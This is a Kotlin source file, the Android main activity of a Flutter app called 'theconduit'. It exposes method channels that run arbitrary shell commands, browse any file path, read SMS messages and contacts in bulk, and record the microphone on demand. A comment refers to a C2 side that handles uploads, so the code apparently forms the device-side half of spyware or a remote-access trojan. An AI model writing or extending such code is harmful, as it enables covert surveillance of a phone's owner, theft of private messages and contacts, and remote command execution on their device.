package com.zeroone.theconduit // أو اسم الحزمة الخاصة بك

import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import android.util.Log
import java.io.File
import android.Manifest // Required for permissions
import android.content.pm.PackageManager // Required for permissions
import androidx.core.app.ActivityCompat // Required for permissions
import androidx.core.content.ContextCompat // Required for permissions

// Imports for SMS
import android.provider.Telephony
import android.database.Cursor

// Imports for Contacts
import android.provider.ContactsContract

// Imports for Microphone
import android.media.MediaRecorder
import java.io.IOException
import android.os.Build // For API level checks

class MainActivity : FlutterActivity() {
    private val FILES_CHANNEL_NAME = "com.zeroone.theconduit/files"
    private val NATIVE_FEATURES_CHANNEL_NAME = "com.zeroone.theconduit/native_features" // New channel
    private val TAG = "MainActivity"

    private val REQUEST_CODE_PERMISSIONS = 101
    private val REQUIRED_PERMISSIONS = mutableListOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.WRITE_EXTERNAL_STORAGE // For saving recordings before API 29
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // For Android 13 and above, specific media permissions might be needed if not using scoped storage properly.
            // add(Manifest.permission.READ_MEDIA_AUDIO)
        } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            // WRITE_EXTERNAL_STORAGE is generally sufficient for older versions
        }
    }.toTypedArray()

    private var mediaRecorder: MediaRecorder? = null
    private var audioOutputFile: File? = null

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        Log.d(TAG, "Configuring Flutter Engine and Method Channels")

        // Check and request permissions if not already granted
        if (!allPermissionsGranted()) {
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, REQUEST_CODE_PERMISSIONS)
        }

        // Files Channel (existing)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, FILES_CHANNEL_NAME).setMethodCallHandler {
            call, result ->
            when (call.method) {
                "listFiles" -> {
                    val path = call.argument<String>("path") ?: context.filesDir.absolutePath
                    Log.d(TAG, "listFiles called for path: $path")
                    try {
                        val directory = File(path)
                        if (!directory.exists()) {
                             Log.w(TAG, "Path does not exist: $path")
                             result.error("INVALID_PATH", "Path does not exist.", null)
                             return@setMethodCallHandler
                        }
                        if (!directory.isDirectory) {
                            Log.w(TAG, "Path is not a directory: $path")
                            result.error("INVALID_PATH", "Path is not a valid directory.", null)
                            return@setMethodCallHandler
                        }
                        if (!directory.canRead()) {
                            Log.w(TAG, "Cannot read directory: $path (Check permissions)")
                            result.error("PERMISSION_DENIED", "Cannot read directory. Check permissions.", null)
                            return@setMethodCallHandler
                        }

                        val filesList = directory.listFiles()?.mapNotNull { file ->
                            mapOf(
                                "name" to file.name,
                                "path" to file.absolutePath,
                                "isDirectory" to file.isDirectory,
                                "size" to file.length(),
                                "lastModified" to file.lastModified(),
                                "canRead" to file.canRead(),
                                "canWrite" to file.canWrite(),
                                "isHidden" to file.isHidden
                            )
                        } ?: emptyList()
                        
                        Log.d(TAG, "Found ${filesList.size} items in $path")
                        result.success(mapOf("files" to filesList, "path" to directory.absolutePath))

                    } catch (e: SecurityException) {
                        Log.e(TAG, "Security error listing files for path $path", e)
                        result.error("PERMISSION_DENIED", "SecurityException: Permission denied for $path.", e.localizedMessage)
                    }
                    catch (e: Exception) {
                        Log.e(TAG, "Error listing files for path $path", e)
                        result.error("LIST_FILES_FAILED", "Failed to list files for $path.", e.localizedMessage)
                    }
                }
                "executeShell" -> {
                    val command = call.argument<String>("command")
                    val args = call.argument<List<String>>("args") ?: emptyList()
                    Log.d(TAG, "executeShell called for command: $command with args: $args")
                    try {
                        if (command.isNullOrEmpty()) {
                            result.error("INVALID_ARGUMENT", "Command cannot be null or empty", null)
                            return@setMethodCallHandler
                        }
                        
                        val processBuilder = ProcessBuilder(listOf(command) + args)
                        processBuilder.redirectErrorStream(true)
                        val process = processBuilder.start()
                        val outputReader = process.inputStream.bufferedReader()
                        val output = StringBuilder()
                        var line: String?
                        while (outputReader.readLine().also { line = it } != null) {
                            output.append(line).append("\n")
                        }
                        process.waitFor()
                        val exitCode = process.exitValue()
                        Log.d(TAG, "Shell command '$command' executed. Exit code: $exitCode. Output (first 200 chars): ${output.toString().take(200)}")
                        result.success(mapOf(
                            "command" to command,
                            "args" to args,
                            "exitCode" to exitCode,
                            "stdout" to output.toString().trim(),
                            "stderr" to "" 
                        ))

                    } catch (ioe: java.io.IOException) {
                         Log.e(TAG, "IOException for command $command (Command not found or permission issue?)", ioe)
                         result.error("EXECUTION_FAILED", "Command not found or IO error for '$command'.", ioe.localizedMessage)
                    } 
                    catch (se: SecurityException) {
                        Log.e(TAG, "SecurityException executing command $command", se)
                        result.error("PERMISSION_DENIED", "SecurityException: Permission denied for executing '$command'.", se.localizedMessage)
                    }
                    catch (e: Exception) {
                        Log.e(TAG, "Error executing shell command $command", e)
                        result.error("EXECUTION_FAILED", "Failed to execute shell command '$command'.", e.localizedMessage)
                    }
                }
                else -> result.notImplemented()
            }
        }

        // Native Features Channel (New)
        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, NATIVE_FEATURES_CHANNEL_NAME).setMethodCallHandler {
            call, result ->
            when (call.method) {
                "getSmsList" -> {
                    Log.d(TAG, "getSmsList called")
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                        try {
                            val smsList = mutableListOf<Map<String, Any?>>()
                            val cursor: Cursor? = contentResolver.query(
                                Telephony.Sms.CONTENT_URI,
                                null, // Projection: null means all columns
                                null, // Selection
                                null, // Selection args
                                Telephony.Sms.DEFAULT_SORT_ORDER // Sort order
                            )
                            cursor?.use { // Auto-closes cursor
                                if (it.moveToFirst()) {
                                    do {
                                        val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                                        val dateMs = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                                        val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE)) // INBOX, SENT, DRAFT etc.
                                        
                                        smsList.add(mapOf(
                                            "address" to address,
                                            "body" to body,
                                            "date" to dateMs,
                                            "type" to when(type) {
                                                Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
                                                Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
                                                Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
                                                Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
                                                Telephony.Sms.MESSAGE_TYPE_FAILED -> "failed"
                                                Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
                                                else -> "unknown"
                                            }
                                        ))
                                    } while (it.moveToNext() && smsList.size < 200) // Limit to 200 messages for performance
                                }
                            }
                            Log.d(TAG, "Returning ${smsList.size} SMS messages.")
                            result.success(smsList)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error reading SMS list", e)
                            result.error("SMS_READ_FAILED", "Failed to read SMS list.", e.localizedMessage)
                        }
                    } else {
                        Log.w(TAG, "READ_SMS permission not granted.")
                        result.error("PERMISSION_DENIED", "READ_SMS permission not granted.", null)
                    }
                }
                "getContactsList" -> {
                    Log.d(TAG, "getContactsList called")
                     if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                        try {
                            val contactsList = mutableListOf<Map<String, Any?>>()
                            val cursor: Cursor? = contentResolver.query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                arrayOf(
                                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                                    ContactsContract.CommonDataKinds.Phone.NUMBER
                                ),
                                null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                            )
                            cursor?.use {
                                while (it.moveToNext() && contactsList.size < 500) { // Limit contacts
                                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                                    val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                    contactsList.add(mapOf("name" to name, "number" to number))
                                }
                            }
                            Log.d(TAG, "Returning ${contactsList.size} contacts.")
                            result.success(contactsList)
                        } catch (e: Exception) {
                            Log.e(TAG, "Error reading contacts list", e)
                            result.error("CONTACTS_READ_FAILED", "Failed to read contacts list.", e.localizedMessage)
                        }
                    } else {
                         Log.w(TAG, "READ_CONTACTS permission not granted.")
                        result.error("PERMISSION_DENIED", "READ_CONTACTS permission not granted.", null)
                    }
                }
                "recordAudio" -> {
                    val durationSeconds = call.argument<Int>("duration_seconds") ?: 10
                    Log.d(TAG, "recordAudio called for $durationSeconds seconds")

                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                        result.error("PERMISSION_DENIED", "RECORD_AUDIO permission not granted.", null)
                        return@setMethodCallHandler
                    }
                    // Optional: Check for WRITE_EXTERNAL_STORAGE for older Android versions if saving to public directories
                    // if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q && ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                    //     result.error("PERMISSION_DENIED", "WRITE_EXTERNAL_STORAGE permission not granted for older Android.", null)
                    //     return@setMethodCallHandler
                    // }

                    try {
                        stopRecording() // Stop any previous recording

                        val outputDir = context.cacheDir // Save to cache directory
                        audioOutputFile = File.createTempFile("recording_", ".mp4", outputDir)

                        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            MediaRecorder(context)
                        } else {
                            @Suppress("DEPRECATION")
                            MediaRecorder()
                        }
                        
                        mediaRecorder?.apply {
                            setAudioSource(MediaRecorder.AudioSource.MIC)
                            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                            setOutputFile(audioOutputFile!!.absolutePath)
                            prepare()
                            start()
                        }
                        Log.d(TAG, "Audio recording started. Output file: ${audioOutputFile!!.absolutePath}")

                        // Stop recording after the specified duration
                        // Using a Handler to post a delayed runnable is safer than Thread.sleep in Android UI context
                        android.os.Handler(mainLooper).postDelayed({
                            val path = stopRecording()
                            if (path != null) {
                                result.success(path)
                            } else {
                                result.error("RECORDING_STOP_FAILED", "Failed to stop recording or file path is null.", null)
                            }
                        }, durationSeconds * 1000L)

                    } catch (e: IOException) {
                        Log.e(TAG, "IOException during audio recording setup", e)
                        result.error("RECORDING_IO_FAILED", "IOException: ${e.message}", e.localizedMessage)
                         stopRecording() // Clean up
                    } catch (e: IllegalStateException) {
                        Log.e(TAG, "IllegalStateException during audio recording", e)
                        result.error("RECORDING_STATE_FAILED", "IllegalStateException: ${e.message}", e.localizedMessage)
                         stopRecording() // Clean up
                    } catch (e: Exception) {
                        Log.e(TAG, "Generic error during audio recording", e)
                        result.error("RECORDING_FAILED", "Failed to record audio: ${e.message}", e.localizedMessage)
                         stopRecording() // Clean up
                    }
                }
                // "stopMicRecording" - If you add a manual stop command
                // "stopMicRecording" -> {
                //    val path = stopRecording()
                //    if (path != null) {
                //        result.success(path)
                //    } else {
                //        result.error("RECORDING_STOP_FAILED", "Failed to stop recording or file not available.", null)
                //    }
                // }
                else -> result.notImplemented()
            }
        }

        Log.d(TAG, "All Method Channels configured.")
    }

    private fun allPermissionsGranted() = REQUIRED_PERMISSIONS.all {
        ContextCompat.checkSelfPermission(baseContext, it) == PackageManager.PERMISSION_GRANTED
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            if (allPermissionsGranted()) {
                Log.d(TAG, "All required permissions granted by user.")
            } else {
                Log.w(TAG, "Not all required permissions were granted by the user.")
                // You might want to inform the Flutter side or disable features
            }
        }
    }

    private fun stopRecording(): String? {
        var path: String? = null
        try {
            mediaRecorder?.apply {
                stop()
                release()
            }
            path = audioOutputFile?.absolutePath
            Log.d(TAG, "Audio recording stopped. File: $path")
        } catch (e: IllegalStateException) {
            Log.e(TAG, "IllegalStateException on stopRecording (already stopped or not started?)", e)
            // It might have been stopped by the timer already, or never started.
        } catch (e: RuntimeException) { // Catch other potential runtime errors during stop/release
            Log.e(TAG, "RuntimeException on stopRecording", e)
        } finally {
            mediaRecorder = null
            // Don't delete audioOutputFile here, it needs to be returned/uploaded.
            // The Flutter side (or C2) should manage its lifecycle after upload.
        }
        return path
    }

    override fun onDestroy() {
        stopRecording() // Ensure recorder is released if activity is destroyed
        super.onDestroy()
    }
}